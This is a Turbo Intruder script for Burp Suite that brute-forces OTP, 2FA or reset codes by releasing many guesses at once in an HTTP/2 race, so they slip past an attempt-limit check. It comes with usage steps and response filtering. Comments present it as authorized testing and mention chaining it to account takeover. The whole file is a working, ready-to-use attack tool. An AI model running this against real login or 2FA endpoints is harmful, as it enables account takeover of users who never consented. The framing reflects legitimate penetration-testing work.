# race_otp_bruteforce.py — Turbo Intruder template: parallel OTP/code brute via rate-limit race.
#
# Runs INSIDE Burp's Turbo Intruder (Jython). Many guesses are released together so they all
# pass the "attempts < N" check before the counter increments -> the attempt limit is bypassed
# and you can submit far more guesses than allowed (guide §10). Chain to login/2FA bypass -> ATO.
#
# HOW TO USE:
#   1) Capture the OTP/2FA/reset-code submit request; replace the code value with %s
#      (e.g.  {"otp":"%s"}  or  code=%s ).
#   2) Burp → "Send to turbo intruder" → paste this script.
#   3) Set RANGE to your code space (e.g. 0..999 for 3-digit; 0..999999 for 6-digit — test a
#      bounded subset first; full 6-digit is large, raise only with authorization).
#   4) Tune the success/failure signal in handleResponse to the app's response.
#
# Authorized testing only. Your own account. Bounded. The point is to PROVE the limit is
# bypassable (more attempts accepted than the cap), not to actually brute a real user. (guide §21)

START = 0
END   = 1000     # 000..999 ; widen only as authorized

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2)        # HTTP/2 single-packet

    # Queue each guess behind one gate, then release together so they share the race window.
    for guess in range(START, END):
        engine.queue(target.req, str(guess).zfill(len(str(END - 1))), gate='g')

    engine.openGate('g')


def handleResponse(req, interesting):
    body = req.response.lower() if req.response else ''
    # TUNE THIS: keep only responses that are NOT the "invalid/too many attempts" signal.
    # A success (or simply: many more accepted attempts than the documented cap) proves the bypass.
    if 'invalid' not in body and 'too many' not in body and 'locked' not in body:
        table.add(req)
    # Evidence for the report: count how many guesses were ACCEPTED/processed vs the stated cap
    # (e.g. cap=5 but 200+ guesses processed) -> rate-limit bypass -> OTP brute feasible -> ATO.
